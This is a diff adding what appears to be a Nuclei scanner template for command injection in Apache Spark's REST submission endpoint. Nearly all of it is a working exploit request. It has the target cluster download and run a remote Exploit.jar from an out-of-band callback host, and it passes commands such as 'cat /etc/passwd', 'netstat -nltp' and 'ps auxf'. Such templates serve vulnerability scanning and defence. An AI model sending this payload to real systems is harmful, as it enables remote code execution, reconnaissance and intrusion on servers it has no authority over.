@@ -1,0 +1,46 @@
+id: apache-spark-rce
+info:
+  name: Apache Spark Submissions/Create Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,spark
+variables:
+  reverse: "{{interactsh-url}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/submissions/create"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+        "action": "CreateSubmissionRequest",
+        "clientSparkVersion": "2.3.1",
+        "appArgs": [
+          "cat /etc/passwd,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
+        ],
+        "appResource": "https://{{reverse}}/Exploit.jar",
+        "environmentVariables": {
+          "SPARK_ENV_LOADED": "1"
+        },
+        "mainClass": "Exploit",
+        "sparkProperties": {
+          "spark.jars": "https://{{reverse}}/Exploit.jar",
+          "spark.driver.supervise": "false",
+          "spark.app.name": "Exploit",
+          "spark.eventLog.enabled": "true",
+          "spark.submit.deployMode": "cluster",
+          "spark.master": "spark://your-ip:6066"
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "submissionId"
+          - "CreateSubmissionResponse"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
